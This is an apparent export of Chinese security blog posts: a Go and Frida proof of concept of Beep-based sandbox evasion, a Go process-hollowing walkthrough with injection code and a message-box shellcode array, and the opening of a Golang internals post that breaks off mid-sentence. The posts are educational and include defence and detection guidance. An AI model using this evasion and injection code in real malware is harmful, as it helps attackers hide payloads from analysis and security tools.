[{"content":"编写Beep函数的POC代码和frida脚本（模拟检测沙箱），模拟Beep规避沙箱的检测机制。\nBeep函数 Beep函数在微软文档中描述为“在扬声器上生成简单的音调。该函数是同步的；它执行一个可警报的等待，直到声音结束后才将控制权返回给调用者。”\n\u0026ldquo;Generates simple tones on the speaker. The function is synchronous; it performs an alertable wait and does not return control to its caller until the sound finishes.\u0026rdquo;\n1 2 3 4 BOOL Beep( [in] DWORD dwFreq, [in] DWORD dwDuration ); 上述文档描述了，Beep函数在播放音调时的行为特性——即同步执行和可警报等待机制，并强调了它在播放完声音之前不会返回控制权给调用者。\n而一些沙箱环境可能不会完全模拟这种硬件交互和等待机制，某些恶意软件将这种特性滥用，把beep函数用于反沙箱检测，。比如，哈希值为ab5dc89a301b5296b29da8dc088b68d72d8b414767faf15bc45f4969c6e0874e的Beep malware样本采用十余种规避技术，其中一种就利用了这种特性。（该样本的分析可见https://www.swascan.com/beep-analisi-malware/）\n这是一个有趣的反沙箱和反调试技术，接下来将通过POC代码模拟Beep的规避行为，更深入了解Beep函数。\nPOC与Hook检测 设计的基本实验思路如下图：\n先将初始的Beep 函数的POC代码beeptest.exe用无修改参数的Frida脚本beep.py模拟沙箱检测，按照设定的延迟时间进行正常执行，输出Beep Beep Beep!字符串。然后将beeptest.exe更改为beeptest1.exe，添加真实时间执行的异常校验逻辑；对应地，将Frida脚本beep.py进行修改为beep_modified.py，添加延迟时间修改的功能，模拟沙箱检测。此时，beeptest1.exe被Hook后告警Running in a sandbox environment!、不输出Beep Beep Beep!字符串。\n详细步骤和效果如下所述。\n编写POC代码beep.go，通过Beep实现延迟执行的效果，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //模拟beep的延迟执行 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;time\u0026#34; ) var ( // Import kernel32.dll kernel32 = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) // Import Beep function procBeep = kernel32.NewProc(\u0026#34;Beep\u0026#34;) ) func main() { start := time.Now() // Call Beep function with frequency 750Hz and duration 60ms procBeep.Call(750, 60) fmt.Println(\u0026#34;[+] Set Duration: \u0026#34;, 60*time.Millisecond) duration := time.Since(start) fmt.Println(\u0026#34;[+] Actual Duration: \u0026#34;, duration) fmt.Println(\u0026#34;[+] Beep Beep Beep!\u0026#34;) } 为了减少实验等待时间、增加实验的效果，并未将Beep的时长调的过长。而现实的恶意软件时长有调至很长的，如65000毫秒，导致分析停滞约1分钟。\n因为沙箱负载了数很多样本，大多沙箱追求的是检测高效性，需要在短时间内完成对样本的自动化检测，沙箱模拟通常持续很短的时间，仿真时间很少超过3～5分。\n编写Python脚本beep.py，利用frida的Hook模拟沙箱，初始版本无延迟检测和操纵时间功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #利用frida模拟沙箱的初级安全检测，无延迟检测和操纵时间功能 import sys import frida def main(target_process): # Spawn the target process and attach to it pid = frida.spawn(target_process) session = frida.attach(pid) # Define the Frida script to hook Beep function script = session.create_script(\u0026#34;\u0026#34;\u0026#34; console.log(\u0026#34;|__\u0026gt; Starting Frida script\u0026#34;); // Resolve the address of the Beep function in kernel32.dll var beepAddr = Module.findExportByName(\u0026#34;kernel32.dll\u0026#34;, \u0026#34;Beep\u0026#34;); console.log(\u0026#34;|__\u0026gt; Hooking Beep at \u0026#34; + beepAddr); Interceptor.attach(beepAddr, { onEnter: function(args) { console.log(\u0026#34;|__\u0026gt; Called Beep\u0026#34;); console.log(\u0026#34;|__\u0026gt; Frequency: \u0026#34; + args[0].toInt32()); console.log(\u0026#34;|__\u0026gt; Duration: \u0026#34; + args[1].toInt32()); }, onLeave: function(retval) { console.log(\u0026#34;|__\u0026gt;|__\u0026gt; Returned from Beep\u0026#34;); } }); \u0026#34;\u0026#34;\u0026#34;) # Load the script into the target process script.load() # Resume the target process frida.resume(pid) # Keep the script running sys.stdin.read() # Detach when done session.detach() if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;target_program\u0026gt;\u0026#34; % sys.argv[0]) sys.exit(1) main(sys.argv[1]) Python脚本 beep.py 对beeptest.exe的频率、时长无检测，beeptest.exe 通过Beep()函数可实现延迟攻击，在蜂鸣时间到达之后输出Beep Beep Beep!字符串。此处模拟，沙箱在仿真时间完成后，beeptest.exe还在休眠未执行真实意图代码，从而绕过沙箱的检测：\n为了解决这种问题，有的沙箱可以实现操纵时间和执行延迟的功能。例如，Cuckoo 沙箱具有休眠跳过功能，可以用非常短的值替换延迟，迫使恶意软件在分析超时之前开始其恶意活动。（见checkpoint的文章Evasions: Timing ）\n在本实验中，如果改进Python脚本 beep.py 为beep_modified.py，利用frida的Hook修改目标程序的“蜂鸣时间”（即，休眠时间），实现实验中“沙箱”的升级。\nfrida脚本beep_modified.py对beeptest.exe的频率、时长进行Hook，动态缩小频率和时长，加快执行beeptest.exe 的程序流：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import sys import frida def main(target_process): pid = frida.spawn(target_process) session = frida.attach(pid) script = session.create_script(\u0026#34;\u0026#34;\u0026#34; console.log(\u0026#34;|__\u0026gt; Starting Frida script\u0026#34;); var beepAddr = Module.findExportByName(\u0026#34;kernel32.dll\u0026#34;, \u0026#34;Beep\u0026#34;); console.log(\u0026#34;|__\u0026gt; Hooking Beep at \u0026#34; + beepAddr); Interceptor.attach(beepAddr, { onEnter: function(args) { console.log(\u0026#34;|__\u0026gt; Called Beep\u0026#34;); console.log(\u0026#34;|__\u0026gt; Original Frequency: \u0026#34; + args[0].toInt32()); console.log(\u0026#34;|__\u0026gt; Original Duration: \u0026#34; + args[1].toInt32()); // 修改频率和时间参数 args[0] = ptr(2); // 设置频率为2Hz args[1] = ptr(20); // 设置时间为20ms console.log(\u0026#34;|__\u0026gt; Modified Frequency: \u0026#34; + args[0].toInt32()); console.log(\u0026#34;|__\u0026gt; Modified Duration: \u0026#34; + args[1].toInt32()); }, onLeave: function(retval) { console.log(\u0026#34;|__\u0026gt;|__\u0026gt; Returned from Beep\u0026#34;); } }); \u0026#34;\u0026#34;\u0026#34;) script.load() frida.resume(pid) sys.stdin.read() session.detach() if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;target_program\u0026gt;\u0026#34; % sys.argv[0]) sys.exit(1) main(sys.argv[1]) 修改频率和时间参数，将beeptest.exe程序原有的频率750HZ设置为2HZ、时间60ms设置为20ms，加速程序的执行，顺利打印出Beep Beep Beep!字符串：\n伴随着实验“沙箱”的升级——用非常短的值替换延迟，而这种休眠跳过技术也可以被绕过。 以下的方法可见Evasions: Timing\n使用多种不同方法并行延迟 使用多种方法测量真实执行时间 使用多种方法获取系统时间 检测调用延迟函数后延迟值是否变化 从另外的进程获取时间，做差异化比较 从NTP、HTTP等外部源获取当前日期和时间 使用RDTSC测量虚拟环境和主机系统的时间差异 检测系统上次关闭、启动时间，做差异化比较 使用无效参数调用可能被Hook的延迟函数 在本实验中，将设定时间与测量真实执行时间做差异化比较的逻辑，从而实现绕过检测/探测仿真环境。将beeptest.exe 的源码beep.go代码更改为beep1.go代码，增加对实际时长有效性的判断，一旦时长异常，将打印出沙箱探测的相关信息——[-] Running in a sandbox environment或[!] Not running in a sandbox environment!\u0026quot;。beep1.go代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;time\u0026#34; ) var ( // Import kernel32.dll kernel32 = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) // Import Beep function procBeep = kernel32.NewProc(\u0026#34;Beep\u0026#34;) ) func isSandbox() bool { start := time.Now() // Call Beep function with frequency 750Hz and duration 60ms procBeep.Call(750, 60) duration := time.Since(start) fmt.Println(\u0026#34;[+] Actual Duration: \u0026#34;, duration) // Check the beep duration was unexpectedly short if duration \u0026lt; 60*time.Millisecond { fmt.Println(\u0026#34;[+] Set Duration: \u0026#34;, 60*time.Millisecond) return true } return false } func main() { if isSandbox() { fmt.Println(\u0026#34;[-] Running in a sandbox environment!\u0026#34;) } else { fmt.Println(\u0026#34;[!] Not running in a sandbox environment!\u0026#34;) fmt.Println(\u0026#34;[+] Beep Beep Beep!\u0026#34;) } } 使用frida脚本模拟沙箱对Beep的检测，beep.py脚本不会更改beeptest1.exe （beep1.go代码编译的程序）的延迟时间，beeptest1.exe 正常执行，打印出[+] Beep Beep Beep!字符串。beep_modified.py更改beeptest1.exe 执行时间，beeptest1.exe 对此打印出检测到沙盒环境的[-] Running in a sandbox environment!字符串：\n本文编写Beep函数的POC代码和frida脚本（模拟沙箱），简化地模拟基于时间延迟的沙箱规避技术，并简单地升级了彼此的攻防对抗。而这种攻防对抗在现实中仍在持续进行，从检测和防御的角度来看，如果单一地对这种延迟进行时间Hook与操纵，只会让这类攻击逃之夭夭。\n本文实验相关代码已上传github，见https://github.com/zz1gg/beep-antisandbox\nThis is a practical case for educational purposes only.\nReferences https://learn.microsoft.com/en-us/windows/win32/api/utilapiset/nf-utilapiset-beep https://malwareandstuff.com/examining-smokeloaders-anti-hooking-technique/ https://evasions.checkpoint.com/src/Evasions/techniques/timing.html https://www.swascan.com/beep-analisi-malware/ ","description":"","id":5,"section":"posts","tags":["Windows","beep","frida","anti-sandbox","Golang","Hook"],"title":"滥用Beep函数规避检测","uri":"https://zz1gg.github.io/posts/beep-function/"},{"content":"关于目标进程调试与分析、Shellcode注入到目标进程的 Process Hollowing的实现思路，以及Process Hollowing（Shellcode）攻击延展的攻击检测防御思路。\nProcess Hollowing 定义：Process Hollowing 是一种进程注入技术，常用于恶意软件开发和安全研究，攻击者将恶意代码隐藏在看似没有威胁的进程中，然后隐式注入到目标进程。这种技术是一种经典的隐藏恶意行为，绕过安全软件检测的攻击手段。本文POC案例的思路是，创建一个挂起的目标进程，然后替换该进程的内存映像，使其运行目标代码（Shellcode）。\n(如果需要绕过这些安全软件检测，可以结合其它的安全技术，实现多形态的变种技术，但这暂时并不是本文所重点描述的，所以在此不展开讨论。)\n本文内容主要讲述关于目标进程调试与分析、Shellcode注入到目标进程的 Process Hollowing的实现思路，以及由Process Hollowing（Shellcode）攻击延展的检测与防御。\nPOC的实现与调试分析 启动c:\\\\windows\\\\system32\\\\svchost.exe进程并挂起，进程ID为8852，线程ID为11100。如果要实现这个功能，可以使用Win32的CreateProcessA()函数，而在Golang中可以使用syscall包中的CreateProcess()函数。如果创建的是挂起进程，则需要CREATE_SUSPENDED(0x00000004)。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //定义启动信息和进程信息结构体 var si syscall.StartupInfo var pi syscall.ProcessInformation //调用CreateProcessA()函数创建新进程 err = syscall.CreateProcess( nil, // 模块名（不需要，传入nil） cmdPtr, // 命令行参数。需要先将命令行参数转换为UTF16编码 nil, // 安全描述符 nil, // 安全描述符 false, // 指定是否继承句柄 0, // 创建标志，挂起进程的标志为CREATE_SUSPENDED(值是`0x00000004`) nil, // 环境变量（不需要，传入nil） nil, // 工作目录（不需要，传入nil） \u0026amp;si, // 启动信息 \u0026amp;pi, // 进程信息 ) 使用Process Explorer调试该进程，可发现进程ID和线程ID符合打印的日志：\n调用ntQueryInformationProcess函数将ProcessBasicInformation传递给ProcessInformationClass，从而获得指向Process Environment Block(PEB)结构体的指针\n1 2 3 4 5 6 7 8 9 10 11 12 13 func ntQueryInformationProcess(processHandle syscall.Handle, processInformationClass uint32, processInformation uintptr, processInformationLength uint32, returnLength *uint32) (uintptr, error) { ret, _, err := ntQueryInfoProc.Call( uintptr(processHandle), uintptr(processInformationClass), processInformation, uintptr(processInformationLength), uintptr(unsafe.Pointer(returnLength)), ) if ret != 0 { return 0, err } return ret, nil } Process Environment Block(PEB) 是Windows NT操作系统内部使用的数据结构，由内核创建，用以存储每个进程的运行时数据。PEB里包含了很多攻击者感兴趣的字段，比如ImageBaseAdress、加载的DLL列表。如果要查看其详细情况，可以使用windbg调试。\n附加到挂起的进程svchost.exe(进程ID为8852)，此时使用.reload命令加载符号文件。使用dt _PEB或dt ntdll!_PEB查看PEB数据结构：\n由此看出PEB包含ImageBaseAddress，且ImageBaseAddress在PEB地址的10字节处。所以可以通过PebBaseAddress + 0x10访问到ImageBaseAddress。\n在windbg中使用!peb命令查看到ImageBaseAddress的地址是00007ff7ed410000：\n在POC代码的实现中可以使用ntReadVirtualMemory()函数读取PebBaseAddress+0x10地址，从而获得ImageBaseAddress。而ntReadVirtualProc源自于ntdll.NewProc(\u0026quot;NtReadVirtualMemory\u0026quot;)的导出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ntdll = windows.NewLazySystemDLL(\u0026#34;ntdll.dll\u0026#34;) ntReadVirtualProc = ntdll.NewProc(\u0026#34;NtReadVirtualMemory\u0026#34;) func ntReadVirtualMemory(processHandle syscall.Handle, baseAddress uintptr, buffer uintptr, size uintptr, bytesRead *uintptr) (uintptr, error) { ret, _, err := ntReadVirtualProc.Call( uintptr(processHandle), baseAddress, buffer, size, uintptr(unsafe.Pointer(bytesRead)), ) if ret != 0 { return 0, err } return ret, nil } 得到了ImageBaseAddress的地址，即可以找到IMAGE_DOS_HEADER。在windbg中键入dt _IMAGE_DOS_HEADER 00007ff7ed410000查看IMAGE_DOS_HEADER的结构体内容：\n将e_lfanew的值0n240转换为十六进制0xf0：\n通过e_lfanew可以定位NT头，即00007ff7ed410000 + 0xf0为NT头的地址。在windbg中键入dt _IMAGE_NT_HEADERS64 00007ff7ed410000+0xf0：\n此时，IMAGE_OPTIONAL_HEADER64的地址为IMAGE_NT_HEADERS64 + OptionalHeader，即为ImageBaseAddress + e_lfanew + OptionalHeader 。在内存中，PE文件的可选头中包含AdressOfEntryPoint的相对虚拟地址(RVA)，通过ImageBaseAddress + e_lfanew + OptionalHeader可定位到IMAGE_OPTIONAL_HEADER64的地址为00007ff7ed410000 + 0xf0 + 0x018处。\nPE文件的PE签名是0x4500（4个字节），COFF文件头为20个字节，即可选头在NT头地址+24字节(0x18)处\nPE32文件的可选头大小为224字节(0xE0)，PE32+文件的可选头大小为240字节(0xF0)\n在windbg中，使用dt _IMAGE_OPTIONAL_HEADER64 00007ff7ed410000+0xf0+0x018命令可定位到AddressOfEntryPoint 的值为0x5190：\n使用上述方法得到了目标进程的ImageBaseAddress和AddressOfEntryPoint，进而求得Entry Point的值为ImageBaseAddress + AddressOfEntryPoint，值0x7ff7ed415190：\n获取到EntryPoint，在POC代码注入shellcode后，就可以将程序的执行流程转移到Shellcode所在的内存地址，实现对目标进程的控制。\n接下来，可以通过NtProtectVirtualMemory函数修改目标进程的内存页保护属性，设置为PAGE_READWRITE，以便可以写入Shellcode。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ntProtectVirtualMemory = ntdll.NewProc(\u0026#34;NtProtectVirtualMemory\u0026#34;) // NtProtectVirtualMemory change memory protection. func NtProtectVirtualMemory(processHandle syscall.Handle, baseAddress *uintptr, regionSize uintptr, newProtect uint32, oldProtect *uint32) (uintptr, error) { r1, _, err := syscall.SyscallN( ntProtectVirtualMemory.Addr(), uintptr(processHandle), uintptr(unsafe.Pointer(baseAddress)), uintptr(unsafe.Pointer(\u0026amp;regionSize)), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)), 0, ) if r1 != 0 { return 0, fmt.Errorf(\u0026#34;NtProtectVirtualMemory failed: %v\u0026#34;, err) } return r1, nil } 更改了内存保护属性，可以使用NtWriteVirtualMemory函数将shellcode写入目标进程空间：\n1 NtWriteVirtualMemory(pi.Process, entrypoint, shellcode, uint32(len(shellcode)), \u0026amp;bytesWritten) NtWriteVirtualMemory()函数的自定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ntWriteVirtualMemory calls NtWriteVirtualMemory to write to virtual memory. func NtWriteVirtualMemory(processHandle syscall.Handle, baseAddress uintptr, buffer []byte, numberOfBytesToWrite uint32, numberOfBytesWritten *uint32) (err error) { r1, _, _ := syscall.SyscallN(ntWriteVirtualMemory.Addr(), uintptr(processHandle), baseAddress, uintptr(unsafe.Pointer(\u0026amp;buffer[0])), uintptr(numberOfBytesToWrite), uintptr(unsafe.Pointer(numberOfBytesWritten)), 0) if r1 != 0 { err = syscall.Errno(r1) } return } Shellcode写入完成后需要再次用NtProtectVirtualMemory()函数将内存页保护属性恢复为原来的状态。\n1 2 //restore memory protection status, err = NtProtectVirtualMemory(pi.Process, \u0026amp;base_address, uintptr(shellcode_buffer_length), oldProtect, \u0026amp;temp) 最后使用resumeThread()函数恢复目标进程(svchost.exe)的执行，顺利完成程序执行的“偷梁换柱”。resumeThread()函数的自定义如下：\n1 2 3 4 5 6 7 8 9 10 11 func resumeThread(threadHandle windows.Handle) error { var suspendCount uint32 status, _, _ := NtResumeThread.Call( uintptr(threadHandle), uintptr(unsafe.Pointer(\u0026amp;suspendCount)), ) if status != 0 { return fmt.Errorf(\u0026#34;Failed to call NtResumeThread: %x\u0026#34;, status) } return nil } shellcode成功在目标进程中执行，执行后弹出对话框：\n上述内容实现了在 Windows 平台上使用 Process Hollowing 技术注入 Shellcode 到指定进程的内存空间中，并在目标进程的入口点处执行该 Shellcode。下面是代码的主要步骤和原理：\n创建目标进程：使用 CreateProcessA 函数创建目标进程，并将其挂起，以便后续操作。 获取目标进程的基本信息： 使用 NtQueryInformationProcess 函数获取目标进程的基本信息，包括 PEB 的基址。 获取目标进程的 ImageBaseAddress：通过ntReadVirtualMemory()函数读取目标进程的 PEB 结构体，获取 ImageBaseAddress（PEB 结构体的偏移量为 0x10）。 读取目标进程的 DOS Header 和 NT Header：基于目标进程的 ImageBaseAddress，通过ntReadVirtualMemory()函数读取目标进程的 DOS Header 和 NT Header，以便获取 ImageBaseAddress 和 AddressOfEntryPoint。 修改目标进程的内存保护属性：使用 NtProtectVirtualMemory 函数修改目标进程的内存页保护属性，将其设置为 PAGE_READWRITE，以便写入 Shellcode。 写入 Shellcode 到目标进程的内存空间：使用 NtWriteVirtualMemory 函数将解密后的 Shellcode 写入目标进程的内存空间。 恢复目标进程的内存保护属性：使用 NtProtectVirtualMemory 函数将目标进程的内存页保护属性恢复为原来的状态。 恢复目标进程的执行：使用 NtResumeThread 函数恢复目标进程的执行。 总体来说，该代码通过修改目标进程的内存保护属性，将Shellcode 写入目标进程的内存空间，然后在目标进程的入口点处执行 Shellcode，实现了 Process Hollowing 注入技术\n本文仅用于教育和研究，所以POC代码中的不使用具有危害的shellcode(x64)，仅弹窗\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 shellcode := []byte{0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48, 0x8d, 0x8d, 0x1a, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x14, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00} POC POC代码是用Golang实现，主要使用的是NTAPI （ntdll.dll），详细代码见 https://github.com/zz1gg/ProcessHollowing\n防御与检测 防御 Process Hollowing 的 Shellcode 注入攻击，从大的方面出发可以采取以下措施：\n使用代码签名： 确保所有可执行文件都经过有效的代码签名，这样可以防止恶意者替换或篡改可执行文件。 完整性验证： 在加载可执行文件之前，验证文件的完整性，包括验证文件的哈希值和数字签名等，以确保文件未被篡改。 进程完整性保护： 使用进程完整性保护工具，如 Windows Defender Application Control（WDAC）或其他应用程序白名单解决方案，限制只允许受信任的进程执行。 行为检测和防御： 使用行为检测工具和防御解决方案来监控系统进程行为，及时检测到异常进程行为并采取相应措施。 访问控制： 使用访问控制策略和权限管理工具，限制对系统关键进程和资源的访问权限，降低攻击者利用漏洞进行进程注入的可能性。 安全更新和补丁： 定期更新和打补丁以修复系统和应用程序中的漏洞，以减少攻击面，降低攻击者利用漏洞进行进程注入的可能性。 行为分析和威胁情报： 使用行为分析工具和威胁情报服务，及时发现并应对新型威胁和攻击技术。 教育和培训： 对系统管理员和终端用户进行安全意识教育和培训，提高其对进程注入攻击的认识，加强安全意识和防御能力。 综合利用上述措施，可以有效降低 Process Hollowing 的 Shellcode 注入攻击的风险，并提高系统的安全性。\n但这也只是最大化的降低风险，在现实中是不能完全规避风险。从安全检测和响应的角度，针对此类攻击该怎么办呢？\n一般地，检测-响应的主要流程如下：\n检测阶段： 主动扫描与被动检测：系统可以采取主动扫描文件、进程、网络流量等方式进行检测，也可以通过监控行为、异常检测等被动方式发现恶意活动。 特征匹配：利用恶意软件的特征（如哈希值、行为模式、网络流量模式等）与已知的威胁数据库进行匹配，以识别已知的恶意软件。 行为分析：通过监视进程行为、系统调用、文件操作等，分析程序的行为特征，识别潜在的恶意活动。 确认阶段： 人工研判：对于检测到的可疑活动，安全团队进一步的人工研判、审查，以确认是否确实存在恶意行为。 沟通和信息收集：安全团队可能需要从受害环境收集更多关于被攻击或异常的信息，确定其影响范围和威胁等级。 响应阶段： 隔离和清除：一旦确认存在恶意软件，安全团队将采取措施将受感染的系统或文件隔离，清除恶意软件并修复受损的系统或文件。 警报和通知：安全团队向受害环境的相关者发出告警确认通知。 恢复和预防措施： 系统恢复：安全团队对受感染系统进行恢复和重建，以确保其安全性和稳定性。 漏洞修补和安全加固：对于导致恶意软件传播的漏洞，安全团队将会尽快修补漏洞，并加强系统和网络的安全措施，以防止类似事件再次发生。 而在实际的检测和响应，常常采取筛选威胁告警，溯源与安全产品检测相结合的方式，以便更有效地发现和应对恶意攻击。而这个过程往往会遇到的资源有限的问题，在大多数环境中，Process Hollowing的检测有很多的干扰和“噪音”，要想高效检测出目标攻击，且避免“告警疲劳”，可以参考《Capability Abstraction》 的漏斗模型将Process Hollowing能力抽象化，实现更好的检测点或溯源点，极大减少误报的干扰，提高检测/溯源精确度。\n比如，在本样例的能力抽象化中，可使用Process Explorer工具查看样例程序的进程树，依次分析父子进程的可疑性：\n若环境中有crowdstrike等安全产品，也可以使用安全产品的威胁狩猎功能查看进程链，追溯进程链上进程的可疑程度，如父子进程的签名、哈希值、网络流量、注册表行为等动静态特征，将相关点提取出来，称为抽象图的一个元素。\n本样例的Windows API 函数定位检测可使用API Monitor进行定位，然后针对定位到函数进行Hook或日志追溯：\n本文样例程序可以提取出以下特征点形成以下抽象图：\n通过将攻击的抽象化，可让安全人员的工作重心放在关键和高风险的检测/溯源点，从而实现更加高效的检测/溯源。这种模型化的方法能够最大程度地发挥安全运营人员的智慧和安全产品的优势，更好地实现高效检测，排除更多的“告警噪音”。\n总结 攻防博弈一直都在进行，进程注入技术已经出现很久，也出现了很多不同的实现方式，不同的攻击需要特定分析，制定对应的检测、防御措施。虽然本文只使用了一个进程注入的攻击样例进行叙述，但“万变不离其宗，万法归宗，一通百通”，其它的攻击与检测也可以此作为参照，凭借对细节、知识的关注，抽象化出对应的检测模型，减少大量“误报噪音”，有效保护目标环境。\nReferences https://memn0ps.github.io/process-hollowing/ https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036 https://posts.specterops.io/capability-abstraction-fbeaeeb26384 https://struppigel.blogspot.com/2017/07/process-injection-info-graphic.html ","description":"","id":6,"section":"posts","tags":["Windows","ProcessHollowing","shellcode","Golang","windbg"],"title":"Process Hollowing","uri":"https://zz1gg.github.io/posts/processhollowing/"},{"content":"本文主要整理、记录了笔者在Golang的学习、使用过程中碰到的一些有意思的方面，内容包括但不限于编译生成、程序的元数据、代码函数、汇编、堆栈、安全。\n前言 Golang于2007年诞生，旨在构建一种轻量级且令人愉悦的高效编译编程语言。它可扩展性高、并发强、语法简洁、可跨平台、还支持GC，有的人会因此喜欢上它。有的人也会因为生成的文件过大，且其生态系统和第三方库相对较小，缺少一些成熟的解决方案，不会去选择拥抱它。但“不管黑猫白猫，能捉老鼠的就是好猫”，只要能解决目标场景所遇到的问题，其存在就有一定的合理性和有趣点。\n关于Golang的介绍可至 https://talks.golang.org/2012/splash.article 阅读。\nGolang文件 Golang源码的基本构成：go语言的代码通过包(package)组织，包类似于其他语言的库(libraries)或者模块(modules)。一个包由位于单个目录下的一个或多个.go源文件组成，目录定义包的作用。每个源文件都以一条package声明语句开始（如package main）,指明这个文件属于哪个包。后面跟着它导入的其他包的列表，然后是存储在文件中的程序声明。\n在符合Go代码逻辑和语法写Go代码时，可以使用go build命令生成可执行程序，然后运行、执行。初使用的感觉就是go文件的编译生成就是如此简单，确实从操作上来说很简单实用，但其实Go的编译过程不仅仅如此而已。Golang编译器将Go源码翻译成计算机可执行的机器代码会涉及几个阶段，包括词法分析、解析、语义分析、优化、代码生成。\n词法分析（Lexical Analysis）：将源码分解为标记。编译器识别关键字、标识符、字面值、注释、空白符等其它元素，并转换为标记。 注释和空白符号不会被处理 25个关键字 47个运算符 go/token包定义了FileSet和File对象，用于描述文件集和文件 go/scanner包提供了Scanner来实现词法单元扫描，它在FileSet和File抽象文件集合的基础上进行词法分析 解析（Parse）：编译器执行解析，分析代码的结构，从而创建解析树或抽象语法树（AST），显示各元素之间的关系 Go语言中的AST由go/ast包定义 ast.BasicLit结构体表示一个基础字面值常量，直接构造了字面值 ast.Ident结构体表示标识符类型 parser.ParseExpr函数用于解析单个表达式，返回的ast.Expr是一个表达式抽象借口 ast.BinaryExpr二元算术表达式 语义分析（Semantic Analysis）：编译器对AST执行语义分析，检查错误并确保代码遵守语言设定的规则，验证变量声明、类型、范围及其他语义方面内容 中间码（Intermediate Representation，简称IR）：经过语义分析后，编译器生成中间码 静态单一赋值（Static Single Assignment，简称SSA）：编译器对中间码进行各种优化，如常量折叠、循环优化、死代码消除，从而提高生成机器码的效率 机器码生成（Machine Code）：优化的中间码被转换为机器码。编译器生成汇编代码或直接生成机器码，具体取决于目标体系结构 链接器（Linker）：链接器将生成的机器代码组合成单个可执行文件 执行（Execution）：在目标机器上按照Go源码的原始逻辑进行运行 文件大小 下图中，比较了Linux amd64平台\n下的C二进制程序和Go二进制程序的文件大小，C二进制文件大小远远小于Go编译生成的：\n这是什么原因造成的呢？\n原因一：此处C含动态节区，使用了动态链接库；Go使用的是静态编译，不含动态节区。\n在go build或go 